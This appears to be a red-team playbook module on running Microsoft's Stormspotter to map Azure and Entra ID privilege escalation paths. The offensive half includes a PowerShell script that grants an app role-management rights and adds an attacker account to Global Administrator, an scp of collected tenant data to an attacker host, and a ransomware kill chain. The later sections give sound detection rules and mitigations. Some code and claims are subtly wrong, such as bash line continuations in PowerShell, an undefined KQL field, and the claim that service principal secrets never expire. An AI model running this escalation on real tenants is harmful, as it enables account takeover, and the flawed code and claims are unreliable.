# REC-CLOUD-003: Stormspotter Privilege Escalation Visualization

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-CLOUD-003 |
| **Technique Name** | Stormspotter privilege escalation visualization |
| **MITRE ATT&CK ID** | T1087.004 – Account Discovery: Cloud Account; T1526 – Cloud Service Discovery |
| **CVE** | N/A (Legitimate Microsoft open-source tool) |
| **Platform** | Microsoft Azure Cloud & Entra ID |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | MEDIUM (distinctive API patterns; offline analysis unlogged) |
| **Requires Authentication** | Yes (valid Azure credentials or service principal) |
| **Applicable Versions** | All Azure commercial, government, and sovereign clouds |
| **Last Verified** | December 2025 |
| **Tool Author** | Microsoft Azure Security Engineering (open-source) |
| **Repository** | https://github.com/Azure/Stormspotter |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

## 2. EXECUTIVE SUMMARY

Stormspotter is Microsoft's open-source reconnaissance and visualization framework for Azure environments that transforms raw Azure Resource Manager (ARM) and Entra ID API data into interactive attack graphs via a Neo4j database backend. Unlike AzureHound (which focuses on Entra ID accounts and relationships) or ROADrecon (which emphasizes offline enumeration), Stormspotter specializes in comprehensive infrastructure discovery—mapping the entire Azure resource hierarchy, subscription structure, role-based access control (RBAC) assignments, and service principal permissions to uncover privilege escalation paths and lateral movement opportunities.

**Strategic Capability:**
- Single-phase collection tool leveraging valid Azure credentials (CLI or service principal)
- Comprehensive enumeration of both Entra ID and Azure Resource Manager data
- Neo4j graph database enabling unlimited offline analysis without additional API traffic
- Web-based interactive UI for traversing attack paths and relationship visualization
- Specialized focus on infrastructure-level privilege escalation (subscription → resource group → resource)
- Official Microsoft open-source project (enhances credibility and reduces suspicion during authorized testing)

**Business Impact:**
- Complete visibility into Azure resource architecture and security group hierarchy
- Identification of overprivileged service principals and managed identities
- Discovery of privilege escalation paths within and across subscriptions
- Visualization of attack surface enabling efficient targeting of crown jewels (key vaults, databases, automation accounts)
- Enablement of lateral movement across resource groups and management groups
- Compromise of managed identities leading to persistent backdoors in infrastructure

---

## 3. TECHNICAL PREREQUISITES

### Required Knowledge
- Understanding of Azure Resource Manager (ARM) hierarchy and API
- Familiarity with Azure RBAC roles and role assignments
- Knowledge of service principals and managed identities
- Understanding of subscription, resource group, and management group relationships
- Awareness of Azure resource types and their security implications

### Required Tools

**Stormspotter Components:**
1. **Stormcollector** (data collection)
   - Standalone Python package (recommended: PYZ executable)
   - Available: https://github.com/Azure/Stormspotter/releases
   - Supports Windows, Linux, macOS
   - Current version: 1.0.0-beta4 or later

2. **Stormspotter Backend** (API + Neo4j connector)
   - FastAPI-based REST service
   - Python 3.8+ required
   - Runs on port 9090 (configurable)

3. **Stormspotter Frontend** (UI)
   - Vue.js single-page application
   - Node.js/npm required
   - Runs on port 9091 (configurable)

4. **Neo4j Database** (graph storage)
   - Neo4j v4.x (included in Docker deployment)
   - Ports: 7474 (HTTP), 7687 (Bolt protocol)
   - Default credentials: neo4j/password

**Deployment Methods:**
- **Recommended: Docker Compose** (3 containers: frontend, backend, neo4j)
  - Single command: `docker-compose up`
  - Pre-configured networking and port mapping
  
- **Manual Installation** (Windows/Linux)
  - Install Python 3.8+, Node.js, Neo4j separately
  - Configure port mappings manually
  - More complex but allows custom modifications

**Authentication Methods:**
- Azure CLI (cached credentials via `az login`)
- Service Principal (client ID + secret)
- Custom cloud endpoints (GCC, GCC-H, China, Germany)

### System Requirements
- 2GB+ RAM (more for large Azure environments)
- Disk space: 50MB-1GB depending on environment size
- Outbound HTTPS access to Azure APIs (management.azure.com, graph.microsoft.com)
- No administrative privileges required on execution machine

### Environment Considerations
- **Multi-subscription environments**: Supported; single enumeration covers all accessible subscriptions
- **Cross-tenant scenarios**: Limited (must re-run with different credentials for each tenant)
- **Managed identities**: Fully enumerated with permission analysis
- **Hybrid scenarios**: No on-prem AD enumeration (cloud-only); can be correlated with BloodHound data

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Pre-Execution Intelligence Gathering

1. **Identify Azure Environment Configuration**
   - Determine cloud type: Azure commercial, government (GCC/GCC-H), China, or Germany
   - Identify target subscriptions (to reduce collection scope if desired)
   - Assess credential access options (CLI authentication vs. service principal)
   - Determine RBAC permissions available with credentials

2. **Credential Acquisition Strategy**
   - **Azure CLI user credentials**: User with at least "Reader" role on subscription(s)
   - **Service Principal**: Credentials with Reader/Contributor permissions
   - **Managed Identity**: If running Stormcollector from Azure VM (implicit authentication)
   - **Hybrid user account**: If Azure AD Connect syncs on-prem users

3. **Permission Level Assessment**
   - **Reader role**: Can enumerate subscriptions, resources, RBAC assignments, but no data access
   - **Contributor role**: Broader access; can identify misconfigured resources and automation accounts
   - **Service Principal with Graph permissions**: Can enumerate Entra ID details (users, groups, apps)

4. **Environment Scope Estimation**
   - Small tenant: <1,000 users, <10 subscriptions → ~5-10 minutes collection time
   - Medium tenant: 1,000-10,000 users, 10-50 subscriptions → ~30-60 minutes
   - Large tenant: >10,000 users, >50 subscriptions → ~2+ hours
   - Collection output size: 50MB-500MB depending on resource count

### Risk Assessment

| Factor | Risk Level | Mitigation |
|--------|-----------|-----------|
| **Detection (collection phase)** | MEDIUM | High API volume detectable; consistent with legitimate admin activity |
| **Detection (UI analysis)** | LOW | Offline Neo4j queries; no API traffic during analysis |
| **Credential exposure** | MEDIUM | Service principal secrets; credentials stored in CLI cache |
| **Attribution** | MEDIUM | API calls traceable to source identity; CLI cache tied to user |
| **Operational noise** | LOW | Collection operations appear as normal admin API calls |

---

## 5. DETAILED EXECUTION

### Method 1: Docker-Based Deployment with Azure CLI Authentication

**Objective:** Complete attack environment setup using Docker.

```bash
# Step 1: Clone Stormspotter repository
git clone https://github.com/Azure/Stormspotter.git
cd Stormspotter

# Step 2: Start Docker containers (frontend, backend, neo4j)
docker-compose up

# Output:
# Creating network "stormspotter_default"
# Creating stormspotter_neo4j_1 (container_id)
# Creating stormspotter_backend_1 (container_id)
# Creating stormspotter_frontend_1 (container_id)
# Frontend available at http://localhost:9091
# Neo4j available at http://localhost:7474

# Step 3: Authenticate to Azure (on attacker machine, NOT in container)
az login

# Step 4: Verify subscriptions accessible
az account list --output table

# Step 5: Run Stormcollector (collect data from ALL subscriptions)
cd stormcollector
python3 sscollector.pyz cli

# Prompt: Select subscription(s) to enumerate
# Options: All available, specific subscriptions, exclude subscriptions
# Progress: Outputs status messages as resources are enumerated

# Step 6: Upload collected data to Neo4j backend
# Access http://localhost:9091 in browser
# Click "Database" → "Stormcollector Upload"
# Select stormcollector-output.sqlite (generated in step 5)
# Wait for backend to process and import into Neo4j

# Step 7: Explore attack graph via UI
# Access http://localhost:9091
# Browse resources, relationships, and privilege escalation paths
```

**Key Artifacts Generated:**
- `stormcollector-output.sqlite` – Raw data export
- Neo4j graph database (in container, persisted to volume)
- Generated attack paths and relationship visualizations

---

### Method 2: Service Principal Authentication (Non-Interactive)

**Objective:** Automate enumeration using stored service principal credentials.

```bash
# Step 1: Create service principal with Reader permissions
# (On victim tenant, via Azure Portal or via CLI with admin)
az ad sp create-for-rbac \
  --name "SecurityAuditor" \
  --role "Reader" \
  --scopes "/subscriptions/{subscription-id}"

# Output:
# {
#   "appId": "12345678-...",
#   "password": "secret-password",
#   "tenant": "contoso.onmicrosoft.com",
#   ...
# }

# Step 2: Save credentials for Stormcollector use
export SP_TENANT="contoso.onmicrosoft.com"
export SP_CLIENT_ID="12345678-..."
export SP_CLIENT_SECRET="secret-password"

# Step 3: Run Stormcollector with service principal
python3 sscollector.pyz spn \
  -t "$SP_TENANT" \
  -c "$SP_CLIENT_ID" \
  -s "$SP_CLIENT_SECRET"

# Alternative: Specify only specific subscriptions (reduce API calls)
python3 sscollector.pyz spn \
  -t "$SP_TENANT" \
  -c "$SP_CLIENT_ID" \
  -s "$SP_CLIENT_SECRET" \
  --subs "subscription-1-id" "subscription-2-id"

# Step 4: Upload output (same as Method 1, step 6)
```

**Advantages:**
- No interactive login required (fully automated)
- Credentials can be hardcoded in scripts
- Long-term access (SP credentials don't expire like user sessions)
- Can be scheduled via cron or Task Scheduler for continuous enumeration

---

### Method 3: Privilege Escalation Path Discovery via UI

**Objective:** Identify attack paths from low-privilege user to Global Admin or subscription Owner.

```bash
# After data import into Neo4j:

# Step 1: Access Stormspotter UI at http://localhost:9091

# Step 2: Search for target privilege level
# Options:
#   - Global Administrator (Entra ID role)
#   - Subscription Owner (Azure RBAC)
#   - Resource Group Contributor
#   - Service Principal with high permissions

# Step 3: Click node to view properties
# Example: Global Administrator role shows:
#   - Members (users/SPs directly assigned)
#   - Groups (if inherited via group membership)
#   - Relationships (edges to/from other nodes)

# Step 4: Trace incoming relationships
# Incoming edge = potential privilege escalation path
# Example: User A is member of Group B, Group B is member of Global Admin
# Path: User A → (member of) → Group B → (member of) → Global Admin

# Step 5: Identify dangerous service principals
# Filter UI for SPs with permissions like:
#   - "Microsoft.Authorization/*" (can grant any role)
#   - "Microsoft.Compute/virtualMachines/*" (can execute on VMs)
#   - "Microsoft.KeyVault/*" (can read secrets)

# Step 6: Export attack paths (if UI supports export)
# Otherwise, manually document findings in graph visualization
```

**Example Attack Path Visualization:**
```
LowPrivUser
  ↓ (memberOf)
ContractorsGroup
  ↓ (memberOf)
ApplicationAdministrators
  ↓ (assigned)
ApplicationDeveloperRole (can create SPs with Graph permissions)
  → escalation: Create new SP with "RoleManagement.ReadWrite.Directory"
  → assign self as Global Admin
  → Global Administrator achieved
```

---

### Method 4: Automated Privilege Escalation Exploitation

**Objective:** Chain discovered paths to escalate privileges automatically.

```bash
# After identifying privilege escalation path via Stormspotter:

# Step 1: Identify exploitable service principal (from Stormspotter graph)
# Example: Current user is "Application Administrator"
# Identified: ServicePrincipal "AppDev" has "Application.ReadWrite.All"

# Step 2: Use identified SP to grant self higher permissions
# (Requires PowerShell + Microsoft.Graph module)

Connect-MgGraph -Scopes "Application.ReadWrite.All"

# List owned applications
$myApps = Get-MgUserOwnedObject -UserId "me" -Filter "OData"

# For each app: add dangerous permission
foreach ($app in $myApps) {
  $servicePrincipal = Get-MgServicePrincipal -Filter "appId eq '$($app.appId)'"
  
  # Add "RoleManagement.ReadWrite.Directory" permission
  $params = @{
    principalId = $servicePrincipal.id
    resourceId = "graph-microsoft-com-sp-id"
    appRoleId = "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"  # RoleManagement.ReadWrite.Directory
  }
  
  New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $servicePrincipal.id -BodyParameter $params
}

# Step 3: Use new permission to assign self to Global Admin role
$targetUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.com'"

$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator role template ID

$params = @{
  "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($targetUser.id)"
}

# Add user to Global Admin role
Invoke-MgGraphRequest -Method POST \
  -Uri "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=$globalAdminRoleId/members/`$ref" \
  -Body $params

# Result: User escalated to Global Administrator
```

---

### Method 5: Stormspotter Data Filtering for Large Tenants

**Objective:** Reduce collection time and API volume via targeted enumeration.

```bash
# For large environments (>10,000 users, >50 subscriptions):

# Option 1: Enumerate only Azure resources (skip Entra ID enumeration)
python3 sscollector.pyz cli --azure

# Option 2: Enumerate only Entra ID (skip resource enumeration)
python3 sscollector.pyz cli --aad

# Option 3: Target specific subscriptions only
python3 sscollector.pyz cli --subs "subscription-id-1" "subscription-id-2"

# Option 4: Backfill mode (enum AAD objects only if related to RBAC)
python3 sscollector.pyz cli --azure --backfill

# Option 5: Exclude low-value subscriptions
python3 sscollector.pyz cli --nosubs "dev-subscription-id" "test-subscription-id"

# Reduction in collection time: 50%-70% faster depending on filtering
```

---

### Method 6: Offline Analysis on Air-Gapped Machine

**Objective:** Transfer data for analysis without access to original Azure environment.

```bash
# Step 1: Collection on Azure-connected machine
python3 sscollector.pyz cli
# Generates: stormcollector-output.sqlite

# Step 2: Transfer database to air-gapped machine
scp stormcollector-output.sqlite attacker@offline:/tmp/

# Step 3: Deploy Neo4j and Stormspotter on air-gapped machine (offline)
docker-compose up -d

# Step 4: Import data into Neo4j
# (Via UI upload, same as online method)

# Step 5: Unlimited analysis without network connectivity or API access
# All attack path queries run locally against Neo4j graph
# Zero detection risk from further enumeration

# Advantage: Completely undetectable analysis phase
```

---

## 6. TOOLS & COMMANDS REFERENCE

### Stormcollector Authentication Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `sscollector.pyz cli` | Azure CLI (cached `az login` tokens) | `python3 sscollector.pyz cli` |
| `sscollector.pyz spn` | Service principal (client ID + secret) | `sscollector.pyz spn -t tenant -c clientid -s secret` |

### Stormcollector Enumeration Options

| Flag | Purpose | Example |
|------|---------|---------|
| `--aad` | Entra ID only (skip Azure RM) | `--aad` |
| `--azure` | Azure resources only (skip Entra ID) | `--azure` |
| `--subs <id>` | Specific subscriptions | `--subs sub1 sub2 sub3` |
| `--nosubs <id>` | Exclude subscriptions | `--nosubs dev test` |
| `--backfill` | AAD objects only if related to RBAC | `--azure --backfill` |
| `--cloud` | Alternative cloud (GERMAN, CHINA, USGOV) | `--cloud USGOV` |
| `--json` | Convert SQLite to JSON format | `--json` |

### Neo4j Cypher Query Examples (Advanced Analysis)

```cypher
// Find all users with Global Administrator role
MATCH (u:User)-[:HAS_ROLE]->(r:Role {name: "Global Administrator"})
RETURN u.displayName, u.userPrincipalName;

// Find privilege escalation paths (2 hops)
MATCH path=(u:User)-[*1..2]->(r:Role {name: "Global Administrator"})
RETURN path;

// Find service principals with dangerous permissions
MATCH (sp:ServicePrincipal)-[:HAS_PERMISSION]->(p:Permission)
WHERE p.name CONTAINS "RoleManagement" OR p.name CONTAINS "Application.ReadWrite"
RETURN sp.displayName, p.name;

// Find managed identities with Contributor role
MATCH (mi:ManagedIdentity)-[:HAS_ROLE]->(r:Role {name: "Contributor"})
RETURN mi.displayName, mi.principalId;

// Find subscriptions with public resources
MATCH (s:Subscription)-[:CONTAINS]->(rg:ResourceGroup)-[:CONTAINS]->(r:Resource)
WHERE r.properties CONTAINS "public"
RETURN s.name, r.type, r.name;
```

---

## 7. ATOMIC TESTS (RED TEAM VALIDATION)

### Test 1: Stormcollector Data Collection

**Procedure:**
```bash
az login
python3 sscollector.pyz cli
if [ -f "stormcollector-output.sqlite" ] && [ -s "stormcollector-output.sqlite" ]; then
  echo "✓ Test PASSED: Stormcollector output generated"
  sqlite3 stormcollector-output.sqlite "SELECT COUNT(*) FROM resources;" # Check record count
else
  echo "✗ Test FAILED: No output or empty file"
fi
```

**Success Criteria:** SQLite database with >100 resource records.

### Test 2: Neo4j Graph Database Import

**Procedure:**
```bash
# Via UI: Upload stormcollector-output.sqlite
# Check Neo4j directly:
curl -X POST http://localhost:7474/db/neo4j/tx \
  -H "Authorization: Basic bmVvNGo6cGFzc3dvcmQ=" \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"MATCH (n) RETURN count(n)"}]}'

# Should return count > 100
```

**Success Criteria:** Neo4j contains >100 nodes representing resources and identities.

### Test 3: Privilege Escalation Path Discovery

**Procedure:**
```cypher
// Via Neo4j console or Stormspotter UI
MATCH path=(u:User)-[*1..3]->(r:Role {name: "Global Administrator"})
RETURN count(path) as escalation_paths;
```

**Success Criteria:** At least one path identified (0 paths = properly hardened).

### Test 4: Service Principal Permission Analysis

**Procedure:**
```cypher
MATCH (sp:ServicePrincipal)-[:HAS_PERMISSION]->(p:Permission)
WHERE p.name CONTAINS "RoleManagement.ReadWrite.Directory"
RETURN sp.displayName, count(p) as dangerous_permissions;
```

**Success Criteria:** Identify any SPs with RoleManagement permissions (exploitation opportunity).

---

## 8. MICROSOFT SENTINEL DETECTION

### Detection Rule 1: Stormcollector High-Volume Azure Resource Enumeration

**KQL Query:**
```kusto
AzureActivity
| where TimeGenerated > ago(1h)
| where OperationNameValue in ("Microsoft.Authorization/roleAssignments/read", 
                                 "Microsoft.Resources/subscriptions/resourceGroups/read",
                                 "Microsoft.Resources/deployments/read",
                                 "Microsoft.Compute/virtualMachines/read",
                                 "Microsoft.KeyVault/vaults/read")
| summarize CallCount = count(), 
            UniqueOperations = dcount(OperationNameValue),
            FirstCall = min(TimeGenerated),
            LastCall = max(TimeGenerated)
            by Caller, CallerIpAddress, bin(TimeGenerated, 5m)
| where CallCount > 100  // Threshold for bulk enumeration
| extend AlertSeverity = "High", TechniqueID = "T1526"
```

**Configuration (Azure Portal):**
1. **Microsoft Sentinel** → **Analytics** → **+Create** → **Scheduled query rule**
2. **General:** Name = "Stormcollector Resource Enumeration Pattern"
3. **Set rule logic:** Paste KQL above; run every 5 minutes; lookup 1 hour
4. **Incident settings:** Create incidents, group by Caller + IP
5. **Click Create**

---

### Detection Rule 2: Service Principal Dangerous Permission Assignment

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add app role assignment to service principal"
| where Result =~ "success"
| mv-expand TargetResources
| where TargetResources.modifiedProperties any (x => x.displayName == "AppRole.Value" and (x.newValue contains "RoleManagement" or x.newValue contains "Application.ReadWrite"))
| project TimeGenerated, InitiatedByUserOrApp=InitiatedBy.user.userPrincipalName, TargetSP=TargetResources.displayName, GrantedPermission=TargetResources.modifiedProperties[0].newValue
| extend AlertSeverity = "High"
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Note:** Stormcollector executes externally; Windows Event Logs do NOT capture its activity directly.

**Monitor these cloud-side events:**

1. **Azure Activity Log** (subscription level)
   - Filter for bulk read operations on roles, resources, RBAC
   - Alert on >500 API calls in 5-minute window
   - Correlate with caller IP, identity

2. **Entra ID Sign-in Logs**
   - Service principal or user sign-ins from unusual locations
   - Non-interactive sign-ins with high API volume

3. **Entra ID Audit Logs**
   - Role assignment changes
   - Service principal creation
   - App consent grants

---

## 10. SYSMON DETECTION PATTERNS

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Detect Stormcollector execution -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">sscollector</CommandLine>
      <CommandLine condition="contains">stormcollector</CommandLine>
      <Image condition="contains">python</Image>
    </ProcessCreate>
    
    <!-- Detect Docker compose for Stormspotter deployment -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">docker-compose up</CommandLine>
      <CommandLine condition="contains">stormspotter</CommandLine>
    </ProcessCreate>
    
    <!-- Detect network connections to Azure APIs -->
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">management.azure.com</DestinationHostname>
      <DestinationHostname condition="contains">graph.microsoft.com</DestinationHostname>
      <DestinationPort>443</DestinationPort>
    </NetworkConnect>
    
    <!-- Detect Neo4j database access (port 7474, 7687) -->
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">7474</DestinationPort>
      <DestinationPort condition="is">7687</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR IDENTITY

**Alert Configuration:**
- **Alert:** "Suspicious Azure API enumeration pattern"
- **Severity:** High
- **Applies To:** Tenants with Defender for Identity enabled

---

## 12. FALSE POSITIVE ANALYSIS

| Legitimate Activity | Stormspotter Behavior | Distinguish By |
|-------------------|---------------------|-----------------|
| Compliance auditing tools | Bulk read of roles/resources | Scope (all vs. specific); frequency (scheduled) |
| Azure governance tools | Permission enumeration | Expected service accounts; lower volume |
| IT change management | Resource inventory sync | Lower frequency; normal business hours |
| EDR/CSPM tools | Baseline collection | Internal IP ranges; whitelisted agents |
| Admin PowerShell scripts | API calls to ARM | Lower volume; known tools (PowerShell modules) |

**Tuning:**
```kusto
// Exclude known legitimate sources
let WhitelistedAccounts = dynamic(["svc_audit@contoso.com", "admin_automation@contoso.com"]);
let WhitelistedIPs = dynamic(["10.0.0.0/8"]);

AzureActivity
| where Caller !in (WhitelistedAccounts)
| where CallerIpAddress !startswith "10.0.0"
| where CallCount > 100
// ... rest of detection logic
```

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Enable Azure Activity Log Monitoring & Export**
- Stream to Log Analytics Workspace
- Create alerts for bulk API enumeration
- Correlate with caller IP, identity, time

**Implement Conditional Access Policies (CAP)**
- Restrict Graph/ARM API access from non-corporate networks
- Require MFA for high-risk operations
- Block legacy authentication methods

**Restrict Service Principal Creation**
- Require admin consent for new app registrations
- Audit existing SPs with dangerous permissions
- Remove unused SPs regularly

### Priority 2: HIGH

**Implement Privileged Identity Management (PIM)**
- Require just-in-time role activation
- Enforce approval workflow
- Enable MFA for privileged operations

**Enable Managed Identity RBAC Monitoring**
- Audit managed identity role assignments
- Alert on overprivileged identities
- Implement least privilege principle

**Monitor for Impossible Travel**
- Alert on sign-ins from inconsistent geographic locations
- Correlate with API activity patterns

---

## 14. DETECTION & INCIDENT RESPONSE

### Forensic Artifact Collection

**If Stormspotter reconnaissance suspected:**

```powershell
# 1. Collect Azure Activity Logs for bulk API calls
Search-AzLog -MaxResults 10000 -ResourceGroup "*" `
  -StartTime (Get-Date).AddDays(-7) `
  -EndTime (Get-Date) | `
  Export-Csv -Path azure_activity.csv

# 2. Check for Stormcollector executable or process traces
Get-ChildItem -Path "C:\Users" -Recurse -Include "sscollector*" -ErrorAction SilentlyContinue

# 3. Check for Neo4j database ports (7474, 7687) listening
netstat -ano | findstr /R ":7474|:7687"

# 4. Check Docker containers running Stormspotter
docker ps | grep -i stormspotter

# 5. Collect service principal sign-in logs
Get-MgAuditLogSignIn -Filter "resourceDisplayName eq 'Azure Resource Manager'" | Export-Csv arm_signins.csv
```

### Incident Response Steps

1. **Confirm Reconnaissance Occurred**
   - Verify bulk API enumeration in Activity Logs
   - Identify source identity and IP address
   - Determine scope of enumeration (which subscriptions, resources)

2. **Assess Compromise Scope**
   - Which data was accessed (resources, roles, permissions)
   - Whether Entra ID or Azure RM enumerated
   - If privilege escalation paths identified

3. **Detect Follow-On Attacks**
   - Monitor for role assignments to compromised users
   - Check for service principal creation with high permissions
   - Review Conditional Access policy changes
   - Monitor for privilege escalation via identified paths

4. **Containment**
   - Revoke compromised credentials
   - Force re-authentication for affected users
   - Disable service principal if compromised
   - Implement Conditional Access blocks for attacker IP

5. **Eradication**
   - Delete unauthorized service principals
   - Remove malicious role assignments
   - Reset passwords for compromised accounts

---

## 15. RELATED ATTACK CHAINS

### MITRE Technique Dependencies

```
T1078.004 (Valid Accounts: Cloud)
  ↓
T1087.004 (Account Discovery: Cloud – Stormspotter)
  ↓
T1526 (Cloud Service Discovery)
  ↓
T1087.003 (Permission Groups Discovery)
  ↓
T1548.004 (Abuse Elevation Control Mechanism: Azure Role Assignment)
  ↓
T1098.001 (Account Manipulation: Add Service Principal)
  ↓
T1133 (External Remote Services)  [via service principal backdoor]
```

### Real-World Kill Chain: Multi-Subscription Ransomware Deployment

```
Phase 1: Initial Compromise
├─ Phishing → Employee credential theft
└─ Credentials: regular user (no admin rights)

Phase 2: Cloud Reconnaissance (T1526 – Stormspotter)
├─ Run Stormcollector: enumerate all subscriptions
├─ Discover: 20 subscriptions, 500+ VMs, 50+ key vaults
└─ Identify: Automation account with "Contributor" on all subscriptions

Phase 3: Privilege Escalation
├─ Automation account has RunAs credential (service principal)
├─ Extract credential from hybrid worker or automation account
└─ Escalate: Now have "Contributor" on all subscriptions

Phase 4: Lateral Movement & Persistence
├─ Use Invoke-AzVMRunCommand to execute on all VMs
├─ Install ransomware payload on VMs via automation runbooks
└─ Create backdoor service principal for persistent access

Phase 5: Destruction
├─ Delete VMs, key vaults, storage accounts across subscriptions
├─ Disable backups and recovery options
├─ Extort organization for ransom
```

---

## 16. REAL-WORLD EXAMPLES

### Example: Storm-0501 Ransomware Operator (2025)

**Campaign Context:** Financially motivated ransomware group targeting Azure/hybrid environments

**Execution:**
1. Compromised local AD administrator via phishing
2. Accessed Azure via Azure AD Connect sync account
3. Ran Stormcollector to enumerate subscriptions and resources
4. Discovered automation accounts with high privileges
5. Extracted runbook credentials
6. Deployed ransomware via automation to all VMs in all subscriptions

**Detection Opportunities:**
- Bulk API calls to subscriptions/resources APIs (high volume)
- Unusual caller identity (sync account) accessing ARM APIs
- Role assignment changes
- VM script execution across subscriptions

---

## 17. COMPLIANCE & STANDARDS MAPPING

| Standard | Requirement | Mitigation |
|----------|-------------|-----------|
| **CIS Controls** | 6.1, 6.2 (Account Management) | Restrict enumeration via CAP; enable logging |
| **DISA STIG** | Cloud security hardening | Implement MFA, CAP, audit logging |
| **NIST 800-53** | AC-2, SI-4, AU-12 | Logging, CAP, monitoring, incident response |
| **GDPR** | Article 32 (Security) | Detect unauthorized access; incident response |
| **DORA** | Digital Operational Resilience | Cloud service security; incident response |
| **NIS2** | Detection, response capabilities | Real-time detection; IR procedures |
| **ISO 27001** | 5.2, 8.2, 8.15 (Policies, access, logging) | Logging, access controls, monitoring |

---

## 18. REFERENCES & ATTRIBUTION

1. **Stormspotter Official:**
   - Repository: https://github.com/Azure/Stormspotter
   - Microsoft Security Engineering
   - MIT License

2. **MITRE ATT&CK:**
   - T1087.004 – Account Discovery: Cloud Account
   - T1526 – Cloud Service Discovery

3. **Real-World Attribution:**
   - Storm-0501 Azure ransomware campaigns (2025)
   - Scattered Spider cloud reconnaissance (2024-2025)

4. **Azure Attack Paths:**
   - CloudBrothers: Azure Attack Paths research
   - Microsoft Azure security documentation

---